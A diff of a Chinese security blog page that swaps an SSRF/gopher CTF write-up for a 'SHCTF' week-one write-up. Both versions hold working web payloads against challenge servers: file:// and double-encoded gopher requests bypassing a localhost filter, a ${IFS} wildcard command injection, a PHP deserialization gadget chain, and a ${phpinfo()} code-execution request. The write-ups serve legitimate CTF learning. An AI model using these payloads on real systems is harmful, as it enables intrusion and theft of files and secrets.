@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl | 甜筒园</title>
-  <meta name="keywords" content=" ssrf漏洞 , gopher协议 ">
-  <meta name="description" content="2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl | 甜筒园">
+  <title>SHCTF wp | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="SHCTF wp | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="[TOC] WEB[WEEK1]babyRCEGET &#x2F;?rce&#x3D;&#x2F;bin&#x2F;ca?$&amp;#123;IFS&amp;#125;&#x2F;f???  [WEEK1]ez_serialize&lt;?php highlight_file(__FILE__);  class A&amp;#123;   public $var_1;    public function __invoke()&amp;#123;">
 <meta property="og:type" content="article">
@@ -587,9 +587,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-2023-03-15-2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-SHCTF-wp" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl</h1>
+        <h1 class="article-title">SHCTF wp</h1>
     
     <div class="article-meta">
         
@@ -604,24 +604,15 @@
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color2">ssrf漏洞</a>
-            
-            <a class="color4">gopher协议</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-10-04 15:37:17'>2023-10-02 13:25</time>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-24 19:05:02'>2023-03-15 17:45</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>Count:589</span>
+        <span>Count:414</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -651,7 +642,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E5%8D%8F%E8%AE%AE%E7%9A%84GET%E5%92%8CPOST%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F%EF%BC%9A"><span class="toc-text">gopher协议的GET和POST协议格式：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-babyRCE"><span class="toc-text">[WEEK1]babyRCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-ez-serialize"><span class="toc-text">[WEEK1]ez_serialize</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-ezphp"><span class="toc-text">[WEEK1]ezphp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98"><span class="toc-text">[WEEK1]飞机大战</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-%E7%99%BB%E5%BD%95%E5%B0%B1%E7%BB%99flag"><span class="toc-text">[WEEK1]登录就给flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-message"><span class="toc-text">[WEEK1]message</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -667,99 +658,83 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开题目只有一行字：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230324171848365.png" alt="image-20230324171848365"></p>
-<p>有一个传参点，试了一些路径都不行，看题目是easy_curl，尝试使用file协议读取文件：</p>
-<pre><code class="url">?url=file:///var/www/html/index.php
-?url=file:///var/www/html/flag.php
+        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-babyRCE"><span class="toc-text">[WEEK1]babyRCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-ez-serialize"><span class="toc-text">[WEEK1]ez_serialize</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-ezphp"><span class="toc-text">[WEEK1]ezphp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98"><span class="toc-text">[WEEK1]飞机大战</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-%E7%99%BB%E5%BD%95%E5%B0%B1%E7%BB%99flag"><span class="toc-text">[WEEK1]登录就给flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WEEK1-message"><span class="toc-text">[WEEK1]message</span></a></li></ol></li></ol></li></ol></div></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h4><pre><code class="http">GET /?rce=/bin/ca?$&#123;IFS&#125;/f???
 </code></pre>
-<p>发现存在这两个文件，并读到源码：</p>
-<p><strong>index.php</strong></p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
+<h4 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h4><pre><code class="php">&lt;?php
+highlight_file(__FILE__);
 
-if (!isset($_REQUEST[&#39;url&#39;]))&#123;
-    header(&quot;Location: /?url=_&quot;);
-    exit;
+class A&#123;
+  public $var_1;
+
+  public function __invoke()&#123;               //4
+   include($this-&gt;var_1);
+  &#125;
 &#125;
 
-$url=$_REQUEST[&#39;url&#39;];
-$x=parse_url($url);
-if($x[&#39;scheme&#39;]===&#39;gopher&#39;||$x[&#39;scheme&#39;]===&#39;file&#39;)&#123;
-    if(!preg_match(&#39;/localhost|127\.0\.|\。/i&#39;, $url))&#123;
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_exec($ch);
-        curl_close($ch);
-    &#125;
-    else&#123;
-        die(&#39;hacker&#39;);
+class B&#123;
+  public $q;
+  public function __wakeup()  //1
+&#123;
+  if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;q)) &#123;
+            echo &quot;hacker&quot;;
+        &#125;
+&#125;
+
+&#125;
+class C&#123;
+  public $var=&quot;a&quot;;
+  public $z;
+    public function __toString()&#123;     //2
+        return $this-&gt;z-&gt;var;
     &#125;
 &#125;
-else&#123;
-    die(&#39;are you serious？&#39;);
+
+class D&#123;
+  public $p;
+    public function __get($key)&#123;         //3
+        $function = $this-&gt;p;
+        return $function();
+    &#125;
 &#125;
+
+//if(isset($_GET[&#39;payload&#39;]))
+//&#123;
+//    unserialize($_GET[&#39;payload&#39;]);
+//&#125;
+$a=new A();
+$b=new B();
+$c=new C();
+$d=new D();
+$a-&gt;var_1=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;
+$d-&gt;p=$a;
+$c-&gt;z=$d;
+$b-&gt;q=$c;
+echo serialize($b);
 ?&gt;
 </code></pre>
-<p><strong>flag.php</strong></p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
+<pre><code class="http">GET /?payload=O:1:&quot;B&quot;:1:&#123;s:1:&quot;q&quot;;O:1:&quot;C&quot;:2:&#123;s:3:&quot;var&quot;;s:1:&quot;a&quot;;s:1:&quot;z&quot;;O:1:&quot;D&quot;:1:&#123;s:1:&quot;p&quot;;O:1:&quot;A&quot;:1:&#123;s:5:&quot;var_1&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;&#125;
+</code></pre>
+<h4 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a>[WEEK1]ezphp</h4><pre><code class="http">POST /?code=$&#123;phpinfo()&#125;
 
-$flag=getenv(&quot;DASFLAG&quot;);
-$key = md5($flag);
-
-if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;
-    echo &quot;Just View From 127.0.0.1 \n&quot;;
-    echo &quot;\n&quot;;
-    echo $key;
-    return;
+pattern=(.*)
+</code></pre>
+<p>找到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20231002144046836.png" alt="image-20231002144046836"></p>
+<h4 id="WEEK1-飞机大战"><a href="#WEEK1-飞机大战" class="headerlink" title="[WEEK1]飞机大战"></a>[WEEK1]飞机大战</h4><p><code>main.js</code>里有flag，先Unicode解码再BASE64解码</p>
+<pre><code class="js">function won()&#123;
+var galf = &quot;\u005a\u006d\u0078\u0068\u005a\u0033\u0073\u0030\u0059\u006d\u005a\u006d\u004d\u0044\u0067\u0032\u004d\u0053\u0030\u0030\u0059\u006d\u0049\u0031\u004c\u0054\u0052\u006b\u004f\u0054\u0059\u0074\u0059\u0054\u0051\u0079\u004e\u0053\u0031\u0068\u0059\u006a\u004d\u0034\u004d\u006a\u006c\u006d\u004d\u0054\u0059\u0032\u004e\u006d\u0056\u0039\u000a&quot;;
+    alert(atob(galf));
 &#125;
-
-if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;
-    echo $flag;
-    exit;
+function oddbullet(X,Y)&#123;
+    bullet.call(this,X,Y,6,14,&quot;image/bullet1.png&quot;);
 &#125;
-?&gt;
 </code></pre>
-<p>很明显这个题要我们利用SSRF漏洞，访问flag.php文件获得flag的MD5值，再利用gopher协议构造POST请求获取flag。</p>
-<h3 id="gopher协议的GET和POST协议格式："><a href="#gopher协议的GET和POST协议格式：" class="headerlink" title="gopher协议的GET和POST协议格式："></a>gopher协议的GET和POST协议格式：</h3><p>GET数据包只需要开头两行即可，例如：</p>
-<pre><code class="javascript">GET /test.php?a=Hello world HTTP/1.1
-Host: 127.0.0.1
+<h4 id="WEEK1-登录就给flag"><a href="#WEEK1-登录就给flag" class="headerlink" title="[WEEK1]登录就给flag"></a>[WEEK1]登录就给flag</h4><p>用户名admin,爆破弱密码，爆出来是password</p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="WEEK1-message"><a href="#WEEK1-message" class="headerlink" title="[WEEK1]message"></a>[WEEK1]message</h4><p>不太懂misc，不知道出题人是不是这样考的，直接HEX解码发现部分字符是明文的，正好是flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20231002145832726.png" alt="image-20231002145832726"></p>
+<pre><code>SHCTF&#123;ba978405-b1c8-847c-8e69-f62177e4c087&#125;
 </code></pre>
-<p>POST数据包需要五行，例如：</p>
-<pre><code class="javascript">POST /test.php HTTP/1.1
-Host: 127.0.0.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 11
-Connection: close            //这个可以没有，但是没有的话连接结束会延迟一段时间
-
-a=Hello world
-</code></pre>
-<p>访问flag.php获取flag的MD5值：</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230324180413866.png" alt="image-20230324180413866"></p>
-<pre><code class="md5">487707c46f8c478c1c0d0ee1b1a83aeb
-</code></pre>
-<p>构造POST请求：</p>
-<pre><code class="html">POST /flag.php HTTP/1.1
-Host: 127.0.0.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 36
-Connection: close
-
-key=487707c46f8c478c1c0d0ee1b1a83aeb
-</code></pre>
-<p>进行<code>url</code>二次转码，同时注意把%0a换成%0d%0a：</p>
-<pre><code class="url">POST%2520%252Fflag%252Ephp%2520HTTP%252F1%252E1%250D%250AHost%253A%2520127%252E0%252E0%252E1%250D%250AContent%252DType%253A%2520application%252Fx%252Dwww%252Dform%252Durlencoded%250D%250AContent%252DLength%253A%252036%250D%250AConnection%253A%2520close%250D%250A%250D%250Akey%253D487707c46f8c478c1c0d0ee1b1a83aeb%250D%250A
-</code></pre>
-<p>这里注意Content-Length的值必须正确，可以用<code>burpsuite</code>里的<code>Repeater</code>模块模拟发包一次，就会自动帮你算好Content-Length的值</p>
-<p>用gopher协议读一下：</p>
-<pre><code>index.php?url=gopher://0:80/_POST%2520%252Fflag%252Ephp%2520HTTP%252F1%252E1%250D%250AHost%253A%2520127%252E0%252E0%252E1%250D%250AContent%252DType%253A%2520application%252Fx%252Dwww%252Dform%252Durlencoded%250D%250AContent%252DLength%253A%252036%250D%250AConnection%253A%2520close%250D%250A%250D%250Akey%253D487707c46f8c478c1c0d0ee1b1a83aeb%250D%250A
-</code></pre>
-<p>因为<code>.</code>和<code>127.0.0.1</code>过滤了，这里用0就可以，另外注意gopher默认打的是70端口，需要添上80端口才能正常访问到<code>flag.php</code></p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230324185253479.png" alt="image-20230324185253479"></p>
-<p>拿到flag。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
